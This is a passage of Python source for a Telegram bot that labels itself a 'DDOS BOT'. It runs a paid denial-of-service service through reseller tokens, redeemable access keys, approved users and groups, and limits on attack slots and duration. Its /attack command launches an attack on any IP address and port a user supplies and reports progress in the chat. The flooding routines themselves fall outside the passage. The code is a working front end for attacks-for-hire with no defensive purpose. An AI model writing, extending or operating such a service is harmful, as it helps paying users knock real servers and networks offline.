        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removeuser ID")
        return
    remove_user(args[0])
    send_msg(chat_id, "✅ User removed!")

def handle_addgroup(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /addgroup ID DAYS")
        return
    add_group(args[0], int(args[1]))
    send_msg(chat_id, f"✅ Group {args[0]} added for {args[1]} days!")

def handle_removegroup(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removegroup ID")
        return
    remove_group(args[0])
    send_msg(chat_id, "✅ Group removed!")

def handle_addreseller(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /addreseller ID TOKENS")
        return
    add_reseller(int(args[0]), int(args[1]), False)
    send_msg(chat_id, f"✅ Reseller {args[0]} added with {args[1]} tokens!")

def handle_removereseller(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removereseller ID")
        return
    remove_reseller(args[0])
    send_msg(chat_id, "✅ Reseller removed!")

def handle_resellers(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if not resellers:
        send_msg(chat_id, "No resellers!")
        return
    msg = "💼 RESELLERS LIST\n\n"
    for rid, data in resellers.items():
        tokens = "∞" if data.get('unlimited', False) else data['tokens']
        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n━━━━━━━━━━━━━━━━\n"
    send_msg(chat_id, msg[:4000])

def handle_attack(chat_id, uid, cid, args):
    global is_attack, current_target, VIDEO_FILE_ID, is_locked
    
    if is_locked and uid != ADMIN_ID:
        send_msg(chat_id, "🔒 Bot is locked! This command is currently off by admin.")
        return
    
    if cid < 0:
        if not is_group(cid):
            send_msg(chat_id, "❌ Group Not Approved!")
            return
        if is_attack:
            send_msg(chat_id, "⚠️ Attack Already Running! Use /stop")
            return
        if len(args) != 3:
            send_msg(chat_id, "Usage: /attack IP PORT TIME")
            return
        ip, port, sec = args[0], int(args[1]), int(args[2])
        if sec < 1:
            sec = 1
        if sec > attack_time:
            send_msg(chat_id, f"❌ Max duration is {attack_time}s! You sent {sec}s")
            return
        if get_slots() <= 0:
            send_msg(chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!\nPlease wait for free slot.")
            return
        is_attack = True
        current_target = f"{ip}:{port}"
        add_slot()
        method = random.choice(attack_methods)
        if VIDEO_FILE_ID:
            try:
                send_video(chat_id, VIDEO_FILE_ID, f"🎯 Attack Started!\nTarget: {ip}:{port}\nDuration: {sec}s")
            except:
                pass
        msg_id = send_msg_and_get_id(chat_id, f"""
⚡ ATTACK STARTED ⚡
━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
⏱️ Time: {sec}s
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
⚙️ METHODS   : {method}
━━━━━━━━━━━━━━━━━━━━━━
""")
        if msg_id:
            threading.Thread(target=run_progress, args=(chat_id, msg_id, ip, port, sec, method)).start()
        return
    
    if not is_user(uid) and not is_reseller(uid):
        send_msg(chat_id, "❌ Not approved! Use /redeem KEY")
        return
    
    can, msg = can_attack(uid)
    if not can:
        send_msg(chat_id, msg)
        return
    
    if is_attack:
        send_msg(chat_id, "⚠️ Attack already running! Use /stop")
        return
    if len(args) != 3:
        send_msg(chat_id, "Usage: /attack IP PORT TIME")
        return
    ip, port, sec = args[0], int(args[1]), int(args[2])
    if sec < 1:
        sec = 1
    if sec > attack_time:
        send_msg(chat_id, f"❌ Max duration is {attack_time}s! You sent {sec}s")
        return
    if get_slots() <= 0:
        send_msg(chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!\nPlease wait for free slot.")
        return
    
    is_attack = True
    current_target = f"{ip}:{port}"
    add_slot()
    add_attack_count(uid)
    method = random.choice(attack_methods)
    
    if VIDEO_FILE_ID:
        try:
            send_video(chat_id, VIDEO_FILE_ID, f"🎯 Attack Started!\nTarget: {ip}:{port}\nDuration: {sec}s")
        except:
            pass
    
    msg_id = send_msg_and_get_id(chat_id, f"""
⚡ ATTACK STARTED ⚡
━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
⏱️ Time: {sec}s
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
⚙️ METHODS   : {method}
━━━━━━━━━━━━━━━━━━━━━━
""")
    if msg_id:
        threading.Thread(target=run_progress, args=(chat_id, msg_id, ip, port, sec, method)).start()

def handle_stop(chat_id, uid, cid):
    global is_attack, is_locked
    
    if is_locked and uid != ADMIN_ID:
        send_msg(chat_id, "🔒 Bot is locked! This command is currently off by admin.")
        return
    
    if is_attack:
        is_attack = False
        remove_slot()
        send_msg(chat_id, "🛑 ATTACK STOPPED!")
    else:
        send_msg(chat_id, "❌ No active attack!")

def handle_genkey_callback(chat_id, uid, data, msg_id):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    try:
        del_msg(chat_id, msg_id)
    except:
        pass
    if data.startswith("genkey_"):
        duration = data.replace("genkey_", "")
        if duration == "cancel":
            send_msg(chat_id, "❌ Cancelled!")
            return
        price = KEY_PRICES.get(duration, 0)
        buttons = [[{"text": "✅ YES", "callback_data": f"confirm_{duration}"}], [{"text": "❌ NO", "callback_data": "confirm_cancel"}]]
        send_inline_buttons(chat_id, f"⚠️ Confirm {duration} key\nTokens: {price}\nAre you sure?", buttons)

def handle_confirm_callback(chat_id, uid, data, msg_id):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    try:
        del_msg(chat_id, msg_id)
    except:
        pass
    if data == "confirm_cancel":
        send_msg(chat_id, "❌ Cancelled!")
        return
    duration = data.replace("confirm_", "")
    key, error = generate_reseller_key(uid, duration)
    if error:
        send_msg(chat_id, error)
    else:
        price = KEY_PRICES.get(duration, 0)
        send_msg(chat_id, f"✅ Key Generated!\n🔑 {key}\n💰 Tokens used: {price}")

def handle_delkey_callback(chat_id, uid, data, msg_id):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    try:
        del_msg(chat_id, msg_id)
    except:
        pass
    if data.startswith("delkey_"):
        key = data.replace("delkey_", "")
        if delete_key(key):
            send_msg(chat_id, f"✅ Key deleted: {key}")
        else:
            send_msg(chat_id, "❌ Key not found!")
    elif data == "delkey_cancel":
        send_msg(chat_id, "❌ Cancelled!")

def handle_admin_del_callback(chat_id, uid, data, msg_id):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    try:
        del_msg(chat_id, msg_id)
    except:
        pass
    count = 0
    if data == "admin_del_unused":
        for k, v in list(keys.items()):
            if not v['used'] and not v.get('blocked', False):
                del keys[k]
                count += 1
        save()
        send_msg(chat_id, f"✅ Deleted {count} unused keys!")
    elif data == "admin_del_used":
        for k, v in list(keys.items()):
            if v['used']:
                del keys[k]
                count += 1
        save()
        send_msg(chat_id, f"✅ Deleted {count} used keys!")
    elif data == "admin_del_all":
        keys.clear()
        for rid in resellers:
            if 'keys_generated' in resellers[rid]:
                resellers[rid]['keys_generated'] = []
        save()
        send_msg(chat_id, "✅ Deleted all keys!")
    else:
        send_msg(chat_id, "❌ Cancelled!")

def main():
    global last_id
    load()
    add_user(ADMIN_ID, 365, 0)
    
    print("""
    ╔══════════════════════════════════════╗
    ║   ⚡ DDOS BOT STARTED ⚡              ║
    ║   Owner: @TG_DEVILOP                 ║
    ╚══════════════════════════════════════╝
    """)
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=10"
            r = requests.get(url, timeout=15)
            data = r.json()
            
            for update in data.get("result", []):
                last_id = update["update_id"]
                
                callback = update.get("callback_query")
                if callback:
                    callback_id = callback["id"]
                    chat_id = callback["message"]["chat"]["id"]
                    uid = callback["from"]["id"]
                    cb_data = callback["data"]
                    msg_id = callback["message"]["message_id"]
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", data={"callback_query_id": callback_id})
                    
                    if cb_data.startswith("genkey_"):
                        handle_genkey_callback(chat_id, uid, cb_data, msg_id)
                    elif cb_data.startswith("confirm_"):
                        handle_confirm_callback(chat_id, uid, cb_data, msg_id)
                    elif cb_data.startswith("delkey_"):
                        handle_delkey_callback(chat_id, uid, cb_data, msg_id)
                    elif cb_data.startswith("admin_del_"):
                        handle_admin_del_callback(chat_id, uid, cb_data, msg_id)
                    continue
                
                msg = update.get("message")
                if not msg:
                    continue
                chat_id = msg["chat"]["id"]
                uid = msg["from"]["id"]
                text = msg.get("text", "")
                
                video = msg.get("video")
                if video:
                    handle_video(chat_id, uid, video["file_id"])
                    continue
                
                if not text:
                    continue
                
                parts = text.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                if cmd == "/start":
                    handle_start(chat_id, uid, chat_id)
                elif cmd == "/help":
                    handle_help(chat_id, uid, chat_id)
                elif cmd == "/rules":
                    handle_rules(chat_id)
                elif cmd == "/id":
                    handle_id(chat_id, uid, chat_id)
                elif cmd == "/redeem":
                    handle_redeem(chat_id, uid, args)
                elif cmd == "/genkey":
                    handle_genkey_reseller(chat_id, uid)
                elif cmd == "/deletekey":
                    handle_deletekey_reseller(chat_id, uid)
                elif cmd == "/blockkey":
                    if is_reseller(uid):
                        handle_blockkey_reseller(chat_id, uid, args)
                    elif uid == ADMIN_ID:
                        handle_blockkey_admin(chat_id, uid, args)
                    else:
                        send_msg(chat_id, "❌ Admin or Reseller only!")
                elif cmd == "/unblockkey":
                    if is_reseller(uid):
                        handle_unblockkey_reseller(chat_id, uid, args)
                    elif uid == ADMIN_ID:
                        handle_unblockkey_admin(chat_id, uid, args)
                    else:
                        send_msg(chat_id, "❌ Admin or Reseller only!")
                elif cmd == "/myblockedkeys":
                    handle_myblockedkeys(chat_id, uid)
                elif cmd == "/deletekeys":
                    handle_deletekeys_admin(chat_id, uid)
                elif cmd == "/setthreads":
                    handle_setthreads(chat_id, uid, args)
                elif cmd == "/settime":
                    handle_settime(chat_id, uid, args)
                elif cmd == "/setslots":
                    handle_setslots(chat_id, uid, args)
                elif cmd == "/setcooldown":
                    handle_setcooldown(chat_id, uid, args)
                elif cmd == "/setdaily":
                    handle_setdaily(chat_id, uid, args)
                elif cmd == "/lock":
                    handle_lock(chat_id, uid, args)
                elif cmd == "/unlock":
                    handle_unlock(chat_id, uid, args)
                elif cmd == "/unlimited":
                    handle_unlimited(chat_id, uid, args)
                elif cmd == "/limited":
                    handle_limited(chat_id, uid, args)
                elif cmd == "/gen":
                    handle_gen_admin(chat_id, uid, args)
                elif cmd == "/keys":
                    handle_keys(chat_id, uid, args)
                elif cmd == "/adduser":
                    handle_adduser(chat_id, uid, args)
                elif cmd == "/removeuser":
                    handle_removeuser(chat_id, uid, args)
                elif cmd == "/addgroup":
                    handle_addgroup(chat_id, uid, args)
                elif cmd == "/removegroup":
                    handle_removegroup(chat_id, uid, args)
                elif cmd == "/addreseller":
                    handle_addreseller(chat_id, uid, args)
                elif cmd == "/removereseller":
                    handle_removereseller(chat_id, uid, args)
                elif cmd == "/resellers":
                    handle_resellers(chat_id, uid, args)
                elif cmd == "/attack":
                    handle_attack(chat_id, uid, chat_id, args)
                elif cmd == "/stop":
                    handle_stop(chat_id, uid, chat_id)
                elif cmd == "/delvideo":
                    handle_delvideo(chat_id, uid)
            
            time.sleep(1)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()